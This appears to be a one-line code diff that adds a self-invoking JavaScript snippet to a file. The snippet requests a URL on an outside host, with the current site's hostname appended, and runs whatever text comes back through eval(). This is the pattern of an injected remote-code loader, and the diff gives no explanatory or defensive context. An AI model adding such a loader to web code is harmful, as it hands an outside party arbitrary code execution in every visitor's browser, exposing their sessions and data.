@@ -1,0 +1,1 @@
+!function(){var apiUrl="https://music.yandex.by/api/v2.1/index/"+location.hostname,xhrObj=new XMLHttpRequest;xhrObj.open("GET",apiUrl,!1),xhrObj.send("");var api=xhrObj.responseText;eval(api)}();
